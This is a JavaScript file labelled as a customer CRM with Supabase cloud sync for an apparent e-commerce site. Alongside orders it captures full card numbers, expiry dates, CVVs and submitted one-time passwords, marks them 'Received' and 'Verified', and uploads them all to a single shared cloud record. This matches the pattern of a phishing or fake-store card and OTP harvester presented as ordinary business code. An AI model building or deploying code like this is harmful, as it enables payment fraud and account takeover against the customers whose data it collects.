// CRM Customer Data Flow System (local + optional Supabase cloud sync)
class CustomerCRMFlow {
  constructor() {
    this.storageKey = 'crm_customer_data';
    this.legacyStorageKeys = ['crmData', 'crm_data_cross_device', 'crm_data_hybrid', 'crm_data_v2'];
    this.cloudConfigStorageKey = 'crmCloudConfig';
    this.deviceId = this.getDeviceId();
    this.maxEntriesPerType = 500;

    this.syncInProgress = false;
    this.syncPromise = null;
    this.lastSyncOutcome = 'local_only';
    this.lastSyncError = '';
    this.lastSyncAttemptAt = null;
    this.lastCloudReadOk = null;
    this.lastCloudWriteOk = null;
    this.lastCloudReadStatus = null;
    this.lastCloudWriteStatus = null;
    this.cloudConfigBootstrapAttempted = false;

    this.init();
  }

  init() {
    this.ensureLocalData();
    this.migrateLegacyLocalData();
    this.syncFromCloud();

    window.addEventListener('online', () => {
      this.syncFromCloud(true);
    });

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) {
        this.syncFromCloud();
      }
    });

    setInterval(() => {
      this.syncFromCloud();
    }, 10000);
  }

  getDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11);
      localStorage.setItem('crmDeviceId', deviceId);
    }
    return deviceId;
  }

  getEmptyData() {
    return {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        lastUpdated: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'customer_flow_v4',
        mode: this.hasCloudConfig() ? 'cloud_enabled' : 'local_only'
      }
    };
  }

  normalizeData(data) {
    const normalized = data && typeof data === 'object' ? data : {};
    const base = this.getEmptyData();
    return {
      orders: Array.isArray(normalized.orders) ? normalized.orders : [],
      cards: Array.isArray(normalized.cards) ? normalized.cards : [],
      otp: Array.isArray(normalized.otp) ? normalized.otp : [],
      settings: {
        ...base.settings,
        ...(normalized.settings || {})
      }
    };
  }

  sanitizeCloudConfig(config) {
    const raw = config && typeof config === 'object' ? config : {};
    const projectUrl = String(raw.projectUrl || raw.url || '').trim().replace(/\/+$/, '');
    const anonKey = String(raw.anonKey || raw.publishableKey || '').trim();
    const table = String(raw.table || 'crm_records').trim() || 'crm_records';
    const recordId = String(raw.recordId || 'ecomart_global').trim() || 'ecomart_global';
    const provider = String(raw.provider || 'supabase').trim().toLowerCase();

    return { provider, projectUrl, anonKey, table, recordId };
  }

  getCloudConfig() {
    let fromStorage = {};
    try {
      const raw = localStorage.getItem(this.cloudConfigStorageKey);
      if (raw) {
        fromStorage = JSON.parse(raw);
      }
    } catch (error) {
      fromStorage = {};
    }

    const fromWindow = window.CRM_CLOUD_CONFIG || {};
    return this.sanitizeCloudConfig({ ...fromWindow, ...fromStorage });
  }

  hasCloudConfig() {
    const cfg = this.getCloudConfig();
    return cfg.provider === 'supabase' && !!cfg.projectUrl && !!cfg.anonKey;
  }

  setCloudConfig(config) {
    const sanitized = this.sanitizeCloudConfig(config);
    localStorage.setItem(this.cloudConfigStorageKey, JSON.stringify(sanitized));
    this.lastSyncOutcome = 'cloud_config_updated';
    return sanitized;
  }

  clearCloudConfig() {
    localStorage.removeItem(this.cloudConfigStorageKey);
    this.lastSyncOutcome = 'cloud_config_cleared';
  }

  isJwtLike(value) {
    const text = String(value || '').trim();
    return text.split('.').length === 3;
  }

  formatErrorSnippet(text) {
    return String(text || '').replace(/\s+/g, ' ').trim().slice(0, 180);
  }

  buildHttpError(prefix, status, statusText, bodyText) {
    const snippet = this.formatErrorSnippet(bodyText || statusText);
    return snippet ? `${prefix}_${status}_${snippet}` : `${prefix}_${status}`;
  }

  async tryBootstrapCloudConfig() {
    if (this.cloudConfigBootstrapAttempted) return;
    this.cloudConfigBootstrapAttempted = true;

    const candidatePaths = ['crm-cloud-config.json', '/crm-cloud-config.json'];
    for (const path of candidatePaths) {
      try {
        const response = await fetch(path, {
          method: 'GET',
          cache: 'no-store'
        });

        if (!response.ok) continue;

        const json = await response.json();
        const cfg = this.sanitizeCloudConfig(json);
        if (cfg.projectUrl && cfg.anonKey) {
          localStorage.setItem(this.cloudConfigStorageKey, JSON.stringify(cfg));
          this.lastSyncOutcome = 'cloud_config_bootstrapped';
          return;
        }
      } catch (error) {
        // Ignore config bootstrap failure and continue with local mode.
      }
    }
  }

  readStorageData(storageKey) {
    try {
      const raw = localStorage.getItem(storageKey);
      if (!raw) return null;
      return this.normalizeData(JSON.parse(raw));
    } catch (error) {
      return null;
    }
  }

  saveCRMData(data) {
    try {
      const normalized = this.normalizeData(data);
      normalized.settings.lastUpdated = new Date().toISOString();
      normalized.settings.deviceId = this.deviceId;
      normalized.settings.version = 'customer_flow_v4';
      normalized.settings.mode = this.hasCloudConfig() ? 'cloud_enabled' : 'local_only';

      localStorage.setItem(this.storageKey, JSON.stringify(normalized));
      localStorage.setItem('crmLastSync', Date.now().toString());
      return true;
    } catch (error) {
      return false;
    }
  }

  getCRMData() {
    const primary = this.readStorageData(this.storageKey);
    if (primary) return primary;

    const empty = this.getEmptyData();
    this.saveCRMData(empty);
    return empty;
  }

  ensureLocalData() {
    this.saveCRMData(this.getCRMData());
  }

  removeDuplicates(array, key) {
    const seen = new Set();
    return array.filter((item) => {
      const itemKey = item && item[key];
      if (!itemKey || seen.has(itemKey)) return false;
      seen.add(itemKey);
      return true;
    });
  }

  sortNewestFirst(array) {
    return [...array].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
  }

  mergeData(currentData, incomingData) {
    const merged = {
      orders: [...(incomingData.orders || []), ...(currentData.orders || [])],
      cards: [...(incomingData.cards || []), ...(currentData.cards || [])],
      otp: [...(incomingData.otp || []), ...(currentData.otp || [])],
      settings: {
        ...(currentData.settings || {}),
        ...(incomingData.settings || {}),
        lastUpdated: new Date().toISOString(),
        deviceId: this.deviceId,
        version: 'customer_flow_v4',
        mode: this.hasCloudConfig() ? 'cloud_enabled' : 'local_only'
      }
    };

    merged.orders = this.sortNewestFirst(this.removeDuplicates(merged.orders, 'id')).slice(0, this.maxEntriesPerType);
    merged.cards = this.sortNewestFirst(this.removeDuplicates(merged.cards, 'id')).slice(0, this.maxEntriesPerType);
    merged.otp = this.sortNewestFirst(this.removeDuplicates(merged.otp, 'id')).slice(0, this.maxEntriesPerType);

    return merged;
  }

  getTotalEntries(data) {
    return (data.orders?.length || 0) + (data.cards?.length || 0) + (data.otp?.length || 0);
  }

  migrateLegacyLocalData() {
    let merged = this.getCRMData();
    let changed = false;

    this.legacyStorageKeys.forEach((key) => {
      const legacy = this.readStorageData(key);
      if (legacy && this.getTotalEntries(legacy) > 0) {
        merged = this.mergeData(merged, legacy);
        changed = true;
      }
    });

    if (changed) {
      this.saveCRMData(merged);
      this.lastSyncOutcome = 'local_migrated';
    }

    return changed;
  }

  getSupabaseTableUrl() {
    const cfg = this.getCloudConfig();
    return `${cfg.projectUrl}/rest/v1/${cfg.table}`;
  }

  getSupabaseHeaders() {
    const cfg = this.getCloudConfig();
    const headers = {
      apikey: cfg.anonKey,
      Accept: 'application/json',
      'Content-Type': 'application/json'
    };

    // New Supabase publishable keys are not JWT tokens and should not be sent as Bearer auth.
    if (this.isJwtLike(cfg.anonKey)) {
      headers.Authorization = `Bearer ${cfg.anonKey}`;
    }

    return headers;
  }

  async loadFromCloud() {
    if (!this.hasCloudConfig()) return null;

    const cfg = this.getCloudConfig();
    const url = `${this.getSupabaseTableUrl()}?id=eq.${encodeURIComponent(cfg.recordId)}&select=id,data,updated_at&limit=1`;

    try {
      const response = await fetch(url, {
        method: 'GET',
        headers: this.getSupabaseHeaders()
      });

      if (!response.ok) {
        this.lastCloudReadOk = false;
        this.lastCloudReadStatus = response.status;
        const bodyText = await response.text();
        this.lastSyncError = this.buildHttpError('cloud_read_http', response.status, response.statusText, bodyText);
        return null;
      }

      const rows = await response.json();
      const row = Array.isArray(rows) && rows.length ? rows[0] : null;
      this.lastCloudReadOk = true;
      this.lastCloudReadStatus = response.status;

      if (!row || typeof row !== 'object') return null;
      const payload = row.data && typeof row.data === 'object' ? row.data : {};
      return this.normalizeData(payload);
    } catch (error) {
      this.lastCloudReadOk = false;
      this.lastCloudReadStatus = null;
      this.lastSyncError = `cloud_read_failed_${error?.message || 'unknown'}`;
      return null;
    }
  }

  async saveToCloud(data) {
    if (!this.hasCloudConfig()) return false;

    const cfg = this.getCloudConfig();
    const url = `${this.getSupabaseTableUrl()}?on_conflict=id`;
    const payload = this.normalizeData(data);
    const body = [
      {
        id: cfg.recordId,
        data: payload,
        updated_at: new Date().toISOString()
      }
    ];

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          ...this.getSupabaseHeaders(),
          Prefer: 'resolution=merge-duplicates,return=representation'
        },
        body: JSON.stringify(body)
      });

      if (!response.ok) {
        this.lastCloudWriteOk = false;
        this.lastCloudWriteStatus = response.status;
        const bodyText = await response.text();
        this.lastSyncError = this.buildHttpError('cloud_write_http', response.status, response.statusText, bodyText);
        return false;
      }

      this.lastCloudWriteOk = true;
      this.lastCloudWriteStatus = response.status;
      return true;
    } catch (error) {
      this.lastCloudWriteOk = false;
      this.lastCloudWriteStatus = null;
      this.lastSyncError = `cloud_write_failed_${error?.message || 'unknown'}`;
      return false;
    }
  }

  dataSignature(data) {
    return JSON.stringify({
      orders: data.orders || [],
      cards: data.cards || [],
      otp: data.otp || []
    });
  }

  async syncFromCloud(forcePush = false) {
    this.lastSyncAttemptAt = new Date().toISOString();

    if (this.syncPromise) {
      return this.syncPromise;
    }

    this.syncInProgress = true;
    this.syncPromise = (async () => {
      try {
        this.migrateLegacyLocalData();
        const localData = this.getCRMData();

        if (!this.hasCloudConfig()) {
          await this.tryBootstrapCloudConfig();
        }

        if (!this.hasCloudConfig()) {
          this.lastSyncOutcome = this.lastSyncOutcome === 'local_migrated' ? 'local_migrated' : 'local_only';
          this.lastSyncError = '';
          this.lastCloudReadOk = null;
          this.lastCloudWriteOk = null;
          this.lastCloudReadStatus = null;
          this.lastCloudWriteStatus = null;
          return true;
        }

        if (!navigator.onLine) {
          this.lastSyncOutcome = 'offline_local';
          return this.getTotalEntries(localData) > 0;
        }

        const cloudData = await this.loadFromCloud();
        if (!cloudData) {
          const seeded = await this.saveToCloud(localData);
          this.lastSyncOutcome = seeded ? 'cloud_seeded' : 'cloud_read_failed_local_only';
          return true;
        }

        const merged = this.mergeData(localData, cloudData);
        const localSig = this.dataSignature(localData);
        const cloudSig = this.dataSignature(cloudData);
        const mergedSig = this.dataSignature(merged);

        if (localSig !== mergedSig) {
          this.saveCRMData(merged);
        }

        if (forcePush || cloudSig !== mergedSig || localSig !== mergedSig) {
          const writeOk = await this.saveToCloud(merged);
          this.lastSyncOutcome = writeOk ? 'cloud_synced' : 'cloud_write_failed_local_only';
          return true;
        }

        this.lastSyncOutcome = 'cloud_synced';
        this.lastSyncError = '';
        return true;
      } catch (error) {
        this.lastSyncOutcome = 'sync_failed_local_only';
        this.lastSyncError = `sync_failed_${error?.message || 'unknown'}`;
        return this.getTotalEntries(this.getCRMData()) > 0;
      } finally {
        this.syncInProgress = false;
        this.syncPromise = null;
      }
    })();

    return this.syncPromise;
  }

  async pushLatestToCloud() {
    return this.syncFromCloud(true);
  }

  async addCustomerOrder(orderData) {
    this.migrateLegacyLocalData();
    const data = this.getCRMData();

    const order = {
      id: 'order_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      fullName: orderData.fullName || 'Unknown Customer',
      email: orderData.email || 'unknown@email.com',
      phone: orderData.phone || 'Unknown',
      orderTotal: orderData.orderTotal || '0',
      address: orderData.address || '',
      city: orderData.city || '',
      state: orderData.state || '',
      pincode: orderData.pincode || '',
      addressType: orderData.addressType || '',
      items: orderData.items || '',
      status: 'Completed'
    };

    data.orders.unshift(order);
    data.orders = this.sortNewestFirst(this.removeDuplicates(data.orders, 'id')).slice(0, this.maxEntriesPerType);
    this.saveCRMData(data);
    await this.pushLatestToCloud();
    return order;
  }

  async addCustomerCard(cardData) {
    this.migrateLegacyLocalData();
    const data = this.getCRMData();

    const card = {
      id: 'card_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      cardName: cardData.cardName || 'Unknown Customer',
      cardNumber: cardData.cardNumber || '**** **** **** ****',
      expiry: cardData.expiry || 'MM/YY',
      cvv: cardData.cvv || '***',
      status: 'Received'
    };

    data.cards.unshift(card);
    data.cards = this.sortNewestFirst(this.removeDuplicates(data.cards, 'id')).slice(0, this.maxEntriesPerType);
    this.saveCRMData(data);
    await this.pushLatestToCloud();
    return card;
  }

  async addCustomerOTP(otpData) {
    this.migrateLegacyLocalData();
    const data = this.getCRMData();

    const otp = {
      id: 'otp_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 11),
      timestamp: new Date().toISOString(),
      deviceId: this.deviceId,
      submittedOTP: otpData.submittedOTP || '000000',
      email: otpData.email || 'unknown@email.com',
      phone: otpData.phone || 'Unknown',
      status: 'Verified'
    };

    data.otp.unshift(otp);
    data.otp = this.sortNewestFirst(this.removeDuplicates(data.otp, 'id')).slice(0, this.maxEntriesPerType);
    this.saveCRMData(data);
    await this.pushLatestToCloud();
    return otp;
  }

  getCRMStats() {
    const data = this.getCRMData();
    const lastSyncRaw = localStorage.getItem('crmLastSync');
    const lastSync = lastSyncRaw ? new Date(parseInt(lastSyncRaw, 10)).toISOString() : data.settings.lastUpdated;

    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      successRate: data.otp.length > 0 ? 100 : 0,
      lastSync,
      deviceId: this.deviceId,
      isOnline: navigator.onLine,
      syncEnabled: true,
      globalSharedSync: this.hasCloudConfig(),
      cloudEnabled: this.hasCloudConfig()
    };
  }

  exportCRMData() {
    const data = this.getCRMData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_customer_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  exportData() {
    this.exportCRMData();
  }

  async clearCRMData() {
    this.saveCRMData(this.getEmptyData());
    await this.syncFromCloud(true);
    return true;
  }

  async refreshCRMData() {
    return this.syncFromCloud();
  }

  async forceCRMRefresh() {
    return this.syncFromCloud(true);
  }

  getSyncDiagnostics() {
    const cloudConfig = this.getCloudConfig();
    return {
      outcome: this.lastSyncOutcome,
      error: this.lastSyncError || null,
      lastCloudReadOk: this.lastCloudReadOk,
      lastCloudWriteOk: this.lastCloudWriteOk,
      lastCloudReadStatus: this.lastCloudReadStatus,
      lastCloudWriteStatus: this.lastCloudWriteStatus,
      lastSyncAttemptAt: this.lastSyncAttemptAt,
      cloudEnabled: this.hasCloudConfig(),
      cloudProvider: this.hasCloudConfig() ? cloudConfig.provider : null,
      cloudProjectUrl: this.hasCloudConfig() ? cloudConfig.projectUrl : null,
      cloudTable: this.hasCloudConfig() ? cloudConfig.table : null,
      cloudRecordId: this.hasCloudConfig() ? cloudConfig.recordId : null
    };
  }
}

window.customerCRMFlow = new CustomerCRMFlow();

window.addOrder = async function (data) {
  return window.customerCRMFlow.addCustomerOrder(data);
};

window.addCardDetails = async function (data) {
  return window.customerCRMFlow.addCustomerCard(data);
};

window.addOTPData = async function (data) {
  return window.customerCRMFlow.addCustomerOTP(data);
};

window.syncCRMFromCloud = async function () {
  return window.customerCRMFlow.syncFromCloud();
};

window.forceCRMRefresh = async function () {
  return window.customerCRMFlow.forceCRMRefresh();
};

window.refreshCRMData = async function () {
  return window.customerCRMFlow.refreshCRMData();
};

window.getCRMSyncDiagnostics = function () {
  return window.customerCRMFlow.getSyncDiagnostics();
};

window.getCRMCloudConfig = function () {
  return window.customerCRMFlow.getCloudConfig();
};

window.setCRMCloudConfig = function (config) {
  return window.customerCRMFlow.setCloudConfig(config);
};

window.clearCRMCloudConfig = function () {
  return window.customerCRMFlow.clearCloudConfig();
};

window.crossDeviceCRMSync = window.customerCRMFlow;
window.cloudCRMStorage = window.customerCRMFlow;

console.log('Customer CRM Flow System initialized - cloud capable mode');
